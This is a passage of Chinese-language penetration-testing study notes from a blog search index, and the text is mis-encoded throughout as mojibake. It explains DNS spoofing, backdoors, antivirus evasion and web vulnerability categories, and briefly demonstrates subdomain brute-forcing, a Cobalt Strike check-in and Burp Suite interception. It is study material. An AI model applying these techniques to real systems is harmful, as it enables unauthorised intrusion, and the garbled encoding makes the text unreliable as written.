start="4"><li>DNSæ¬ºéª—</li></ol><p>DNSæ¬ºéª—å°±æ˜¯æ”»å‡»è€…å†’å……åŸŸåæœåŠ¡å™¨çš„ä¸€ç§æ¬ºéª—è¡Œä¸ºã€‚</p><p>åŸç†ï¼šå¦‚æœå¯ä»¥å†’å……åŸŸåæœåŠ¡å™¨ï¼Œç„¶åæŠŠæŸ¥è¯¢çš„IPåœ°å€è®¾ä¸ºæ”»å‡»è€…çš„IPåœ°å€ï¼Œè¿™æ ·çš„è¯ï¼Œç”¨æˆ·ä¸Šç½‘å°±åªèƒ½çœ‹åˆ°æ”»å‡»è€…çš„ä¸»é¡µï¼Œè€Œä¸æ˜¯ç”¨æˆ·æƒ³è¦å–å¾—çš„ç½‘ç«™çš„ä¸»é¡µäº†ï¼Œè¿™å°±æ˜¯DNSæ¬ºéª—çš„åŸºæœ¬åŸç†ã€‚DNSæ¬ºéª—å…¶å®å¹¶ä¸æ˜¯çœŸçš„â€œé»‘æ‰â€äº†å¯¹æ–¹çš„ç½‘ç«™ï¼Œè€Œæ˜¯å†’åé¡¶æ›¿ã€æ‹›æ‘‡æ’éª—ç½¢äº†ã€‚</p><h3 id="è„šæœ¬è¯­è¨€"><a href="#è„šæœ¬è¯­è¨€" class="headerlink" title="è„šæœ¬è¯­è¨€"></a>è„šæœ¬è¯­è¨€</h3><h4 id="å¸¸è§çš„è„šæœ¬è¯­è¨€ç±»å‹æœ‰å“ªäº›ï¼Ÿ"><a href="#å¸¸è§çš„è„šæœ¬è¯­è¨€ç±»å‹æœ‰å“ªäº›ï¼Ÿ" class="headerlink" title="å¸¸è§çš„è„šæœ¬è¯­è¨€ç±»å‹æœ‰å“ªäº›ï¼Ÿ"></a>å¸¸è§çš„è„šæœ¬è¯­è¨€ç±»å‹æœ‰å“ªäº›ï¼Ÿ</h4><p>è„šæœ¬è¯­è¨€åˆè¢«ç§°ä¸ºæ‰©å»ºçš„è¯­è¨€ï¼Œæˆ–è€…åŠ¨æ€è¯­è¨€ï¼Œæ˜¯ä¸€ç§ç¼–ç¨‹è¯­è¨€ï¼Œç”¨æ¥æ§åˆ¶è½¯ä»¶åº”ç”¨ç¨‹åºï¼Œè„šæœ¬é€šå¸¸ä»¥æ–‡æœ¬ï¼ˆå¦‚ASCII)ä¿å­˜ï¼Œåªåœ¨è¢«è°ƒç”¨æ—¶è¿›è¡Œè§£é‡Šæˆ–ç¼–è¯‘ã€‚<br>Scalaã€JavaScriptï¼ŒVBScriptï¼ŒActionScriptï¼ŒMAXScriptï¼ŒASPï¼ŒJSPï¼ŒPHPï¼ŒSQLï¼ŒPerlï¼ŒShellï¼Œpythonï¼ŒRubyï¼ŒJavaFXï¼ŒLuaï¼ŒAutoItç­‰</p><h4 id="ä¸åŒè„šæœ¬ç±»å‹ä¸å®‰å…¨æ¼æ´çš„å…³ç³»ï¼Ÿ"><a href="#ä¸åŒè„šæœ¬ç±»å‹ä¸å®‰å…¨æ¼æ´çš„å…³ç³»ï¼Ÿ" class="headerlink" title="ä¸åŒè„šæœ¬ç±»å‹ä¸å®‰å…¨æ¼æ´çš„å…³ç³»ï¼Ÿ"></a>ä¸åŒè„šæœ¬ç±»å‹ä¸å®‰å…¨æ¼æ´çš„å…³ç³»ï¼Ÿ</h4><p>ä¸åŒçš„è„šæœ¬è¯­è¨€å†³å®šäº†å®‰å…¨æ¼æ´çš„å¤šå°‘ã€‚</p><h4 id="æ¼æ´æŒ–æ˜ä»£ç å®¡è®¡ä¸è„šæœ¬ç±»å‹çš„å…³ç³»ï¼Ÿ"><a href="#æ¼æ´æŒ–æ˜ä»£ç å®¡è®¡ä¸è„šæœ¬ç±»å‹çš„å…³ç³»ï¼Ÿ" class="headerlink" title="æ¼æ´æŒ–æ˜ä»£ç å®¡è®¡ä¸è„šæœ¬ç±»å‹çš„å…³ç³»ï¼Ÿ"></a>æ¼æ´æŒ–æ˜ä»£ç å®¡è®¡ä¸è„šæœ¬ç±»å‹çš„å…³ç³»ï¼Ÿ</h4><p>åŒä¸Š</p><h3 id="åé—¨"><a href="#åé—¨" class="headerlink" title="åé—¨"></a>åé—¨</h3><h4 id="ä»€ä¹ˆæ˜¯åé—¨ï¼Ÿæœ‰é‚£äº›åé—¨ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯åé—¨ï¼Ÿæœ‰é‚£äº›åé—¨ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯åé—¨ï¼Ÿæœ‰é‚£äº›åé—¨ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯åé—¨ï¼Ÿæœ‰é‚£äº›åé—¨ï¼Ÿ</h4><p>åé—¨æ˜¯æŒ‡ç»•è¿‡å®‰å…¨æ§åˆ¶è€Œè·å–å¯¹ç¨‹åºæˆ–ç³»ç»Ÿè®¿é—®æƒçš„æ–¹æ³•ã€‚åé—¨çš„æœ€ä¸»è¦ç›®çš„å°±æ˜¯æ–¹ä¾¿ä»¥åå†æ¬¡ç§˜å¯†è¿›å…¥æˆ–è€…æ§åˆ¶ç³»ç»Ÿã€‚æ ¹æ®å®ç°æ–¹å¼çš„ä¸åŒï¼Œå¯ä»¥å°†åé—¨åˆ†ä¸ºç½‘é¡µåé—¨ã€çº¿ç¨‹æ’å…¥åé—¨ã€æ‰©å±•åé—¨ã€C/S åé—¨å’Œè´¦æˆ·åé—¨ç­‰ç±»å‹ã€‚</p><h4 id="åé—¨åœ¨å®‰å…¨æµ‹è¯•ä¸­çš„å®é™…æ„ä¹‰ï¼Ÿ"><a href="#åé—¨åœ¨å®‰å…¨æµ‹è¯•ä¸­çš„å®é™…æ„ä¹‰ï¼Ÿ" class="headerlink" title="åé—¨åœ¨å®‰å…¨æµ‹è¯•ä¸­çš„å®é™…æ„ä¹‰ï¼Ÿ"></a>åé—¨åœ¨å®‰å…¨æµ‹è¯•ä¸­çš„å®é™…æ„ä¹‰ï¼Ÿ</h4><p>(1)æ–¹ä¾¿ä¸‹æ¬¡æ›´æ–¹ä¾¿çš„è¿›æ¥ã€‚ </p><p>(2)è·å–åˆ°ç›¸å…³æƒé™ä¹‹åï¼Œåé—¨ç›¸å½“äºä¸€ä¸ªç®¡é“ï¼Œä¾¿äºæ“ä½œã€‚</p><h3 id="å…³äºåé—¨éœ€è¦äº†è§£é‚£äº›ï¼Ÿï¼ˆç©æ³•ï¼Œå…æ€ï¼‰"><a href="#å…³äºåé—¨éœ€è¦äº†è§£é‚£äº›ï¼Ÿï¼ˆç©æ³•ï¼Œå…æ€ï¼‰" class="headerlink" title="å…³äºåé—¨éœ€è¦äº†è§£é‚£äº›ï¼Ÿï¼ˆç©æ³•ï¼Œå…æ€ï¼‰"></a>å…³äºåé—¨éœ€è¦äº†è§£é‚£äº›ï¼Ÿï¼ˆç©æ³•ï¼Œå…æ€ï¼‰</h3><p>å…æ€ï¼Œå°±æ˜¯ç»•è¿‡æ€æ¯’è½¯ä»¶çš„é˜²æŠ¤ï¼Œé¿å…è¢«æ£€æµ‹åˆ°ã€‚</p><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="WEB-çš„ç»„æˆæ¶æ„æ¨¡å‹ï¼Ÿ"><a href="#WEB-çš„ç»„æˆæ¶æ„æ¨¡å‹ï¼Ÿ" class="headerlink" title="WEB çš„ç»„æˆæ¶æ„æ¨¡å‹ï¼Ÿ"></a>WEB çš„ç»„æˆæ¶æ„æ¨¡å‹ï¼Ÿ</h4><p>ç½‘ç«™æºç ï¼šåˆ†è„šæœ¬ç±»å‹ï¼Œåˆ†åº”ç”¨æ–¹å‘<br>æ“ä½œç³»ç»Ÿï¼šwindows linux<br>ä¸­é—´ä»¶ï¼ˆæ­å»ºå¹³å°ï¼‰ï¼šapache iis tomcat nginx ç­‰<br>æ•°æ®åº“ï¼šaccess mysql mssql oracle sybase db2 postsql ç­‰</p><h4 id="æ¶æ„æ¼æ´å®‰å…¨æµ‹è¯•ç®€è¦ä»‹ç»ï¼Ÿ"><a href="#æ¶æ„æ¼æ´å®‰å…¨æµ‹è¯•ç®€è¦ä»‹ç»ï¼Ÿ" class="headerlink" title="æ¶æ„æ¼æ´å®‰å…¨æµ‹è¯•ç®€è¦ä»‹ç»ï¼Ÿ"></a>æ¶æ„æ¼æ´å®‰å…¨æµ‹è¯•ç®€è¦ä»‹ç»ï¼Ÿ</h4><p>webç½‘ç«™-æ•°æ®åº“æƒé™-æƒé™æå‡-å†…ç½‘ã€‚</p><h4 id="ä¸ºä»€ä¹ˆè¦ä»-WEB-å±‚é¢ä¸ºä¸»ä¸ºé¦–ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆè¦ä»-WEB-å±‚é¢ä¸ºä¸»ä¸ºé¦–ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆè¦ä» WEB å±‚é¢ä¸ºä¸»ä¸ºé¦–ï¼Ÿ"></a>ä¸ºä»€ä¹ˆè¦ä» WEB å±‚é¢ä¸ºä¸»ä¸ºé¦–ï¼Ÿ</h4><p>ä¸ç®¡æ˜¯PCè¿˜æ˜¯APPæœ¬è´¨ä¸Šéƒ½å¯ä»¥ä»¥webä¸ºçªç ´å£ã€‚</p><h3 id="WEBç›¸å…³å®‰å…¨æ¼æ´"><a href="#WEBç›¸å…³å®‰å…¨æ¼æ´" class="headerlink" title="WEBç›¸å…³å®‰å…¨æ¼æ´"></a>WEBç›¸å…³å®‰å…¨æ¼æ´</h3><h4 id="WEB-æºç ç±»å¯¹åº”æ¼æ´"><a href="#WEB-æºç ç±»å¯¹åº”æ¼æ´" class="headerlink" title="WEB æºç ç±»å¯¹åº”æ¼æ´"></a>WEB æºç ç±»å¯¹åº”æ¼æ´</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SQL æ³¨å…¥</span><br><span class="line">æ–‡ä»¶ä¸Šä¼ </span><br><span class="line">XSS</span><br><span class="line">ä»£ç æ‰§è¡Œ</span><br><span class="line">å˜é‡è¦†ç›–</span><br><span class="line">é€»è¾‘æ¼æ´</span><br><span class="line">ååºåˆ—åŒ–ç­‰</span><br></pre></td></tr></table></figure><h4 id="WEB-ä¸­é—´ä»¶å¯¹åº”æ¼æ´"><a href="#WEB-ä¸­é—´ä»¶å¯¹åº”æ¼æ´" class="headerlink" title="WEB ä¸­é—´ä»¶å¯¹åº”æ¼æ´"></a>WEB ä¸­é—´ä»¶å¯¹åº”æ¼æ´</h4><p>æœªæˆæƒè®¿é—®ç­‰ç­‰</p><h4 id="WEB-æ•°æ®åº“å¯¹åº”æ¼æ´"><a href="#WEB-æ•°æ®åº“å¯¹åº”æ¼æ´" class="headerlink" title="WEB æ•°æ®åº“å¯¹åº”æ¼æ´"></a>WEB æ•°æ®åº“å¯¹åº”æ¼æ´</h4><p>å¼±å£ä»¤ç­‰</p><h4 id="WEB-ç³»ç»Ÿå±‚å¯¹åº”æ¼æ´"><a href="#WEB-ç³»ç»Ÿå±‚å¯¹åº”æ¼æ´" class="headerlink" title="WEB ç³»ç»Ÿå±‚å¯¹åº”æ¼æ´"></a>WEB ç³»ç»Ÿå±‚å¯¹åº”æ¼æ´</h4><p>ææƒç›¸å…³çš„</p><h4 id="å…¶ä»–ç¬¬ä¸‰æ–¹å¯¹åº”æ¼æ´"><a href="#å…¶ä»–ç¬¬ä¸‰æ–¹å¯¹åº”æ¼æ´" class="headerlink" title="å…¶ä»–ç¬¬ä¸‰æ–¹å¯¹åº”æ¼æ´"></a>å…¶ä»–ç¬¬ä¸‰æ–¹å¯¹åº”æ¼æ´</h4><p>ç¬¬ä¸‰æ–¹è½¯ä»¶çš„ä¸€äº›æ¼æ´ eg:QQ</p><p>APP æˆ– PC åº”ç”¨ç»“åˆç±»</p><p>Appæˆ–è€…PCè½¯ä»¶çš„æ¼æ´</p><h3 id="æ¼”ç¤ºæ¡ˆä¾‹"><a href="#æ¼”ç¤ºæ¡ˆä¾‹" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹"></a>æ¼”ç¤ºæ¡ˆä¾‹</h3><h4 id="å¤šçº§åŸŸåçš„æšä¸¾æŸ¥æ‰¾"><a href="#å¤šçº§åŸŸåçš„æšä¸¾æŸ¥æ‰¾" class="headerlink" title="å¤šçº§åŸŸåçš„æšä¸¾æŸ¥æ‰¾"></a>å¤šçº§åŸŸåçš„æšä¸¾æŸ¥æ‰¾</h4><p>1.ç›´æ¥ç™¾åº¦</p><p><img src="https://p.pstatp.com/origin/pgc-image/a167f286af034ef4b52cfefbff4a4a26"></p><p>2.é€šè¿‡å·¥å…·è¿›è¡Œçˆ†ç ´</p><p><img src="https://p.pstatp.com/origin/pgc-image/b3befccfafed4a54aa56797d0510b66d"></p><p>è¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯Layerå­åŸŸåçˆ†ç ´å·¥å…·ï¼Œä¸‹è½½é“¾æ¥æ˜¯<code>https://github.com/euphrat1ca/LayerDomainFinder</code>ï¼Œå­—å…¸æ˜¯<code>https://github.com/k8gege/PasswordDic</code>ã€‚</p><p>3.åŸŸåæ³¨å†Œ</p><p> æŸ¥è¯¢Aè®°å½•ã€MXè®°å½•ã€Cè®°å½•</p><h4 id="DNSè§£æä¿®æ”¹ååˆ†æï¼ˆæœ¬åœ°æˆ–æœåŠ¡ï¼‰"><a href="#DNSè§£æä¿®æ”¹ååˆ†æï¼ˆæœ¬åœ°æˆ–æœåŠ¡ï¼‰" class="headerlink" title="DNSè§£æä¿®æ”¹ååˆ†æï¼ˆæœ¬åœ°æˆ–æœåŠ¡ï¼‰"></a>DNSè§£æä¿®æ”¹ååˆ†æï¼ˆæœ¬åœ°æˆ–æœåŠ¡ï¼‰</h4><p>å‰é¢æœ‰å®éªŒè¿‡ï¼Œè¿™é‡Œå°±ä¸å¼„äº†ã€‚</p><h4 id="EXE-åé—¨åŠŸèƒ½åŠå±å®³åŠç±»ä¼¼-WEB-åé—¨"><a href="#EXE-åé—¨åŠŸèƒ½åŠå±å®³åŠç±»ä¼¼-WEB-åé—¨" class="headerlink" title="EXE åé—¨åŠŸèƒ½åŠå±å®³åŠç±»ä¼¼ WEB åé—¨"></a>EXE åé—¨åŠŸèƒ½åŠå±å®³åŠç±»ä¼¼ WEB åé—¨</h4><p>è¿™é‡Œå› ä¸ºæ²¡æœ‰è§†é¢‘ä¸­çš„è½¯ä»¶ï¼Œæ‰€æœ‰æˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯CSï¼Œè¿›è¡Œä¸Šçº¿ã€‚</p><p>å…³äºCSå…·ä½“æ“ä½œå¯ä»¥çœ‹<code>https://soapffz.com/sec/483.html</code></p><p><img src="https://p.pstatp.com/origin/pgc-image/e52e0b1607f949f9969c455f4590d680"></p><p>å¯ä»¥çœ‹åˆ°æˆåŠŸä¸Šçº¿äº†ã€‚</p><h4 id="APPç±»ç»“åˆWEBåè®®ï¼ŒPCç±»ç»“åˆWEBåè®®"><a href="#APPç±»ç»“åˆWEBåè®®ï¼ŒPCç±»ç»“åˆWEBåè®®" class="headerlink" title="APPç±»ç»“åˆWEBåè®®ï¼ŒPCç±»ç»“åˆWEBåè®®"></a>APPç±»ç»“åˆWEBåè®®ï¼ŒPCç±»ç»“åˆWEBåè®®</h4><p>æ‰‹æœºæ¨¡æ‹Ÿå™¨</p><p>éœ€è¦è®¾ç½®ä»£ç†ï¼Œä»£ç†ipä¸ºPCç«¯ipã€‚</p><p><img src="https://p.pstatp.com/origin/pgc-image/250377100e2f44e59eff800692b6280f"></p><p>PCç«¯éœ€è¦é€šè¿‡burp suiteè¿›è¡ŒæŠ“åŒ…ï¼Œè®¾ç½®brupç›‘å¬ç«¯å£ä¸ºä»£ç†æœåŠ¡å™¨ç«¯å£ã€‚</p><p><img src="https://p.pstatp.com/origin/pgc-image/76348fc1d8dd41eab976fbd3f3166592"></p><p>ä¹‹åä¿®æ”¹æ•°æ®åŒ…ï¼Œä¿®æ”¹ç”µè„‘æ•°æ®åŒ…å’Œæ‰‹æœºç«¯ä¸€è‡´ï¼Œä»appåˆ†ç¦»å‡ºWEB æµ‹è¯•æ¼æ´ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> åŸºç¡€å…¥é—¨ </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
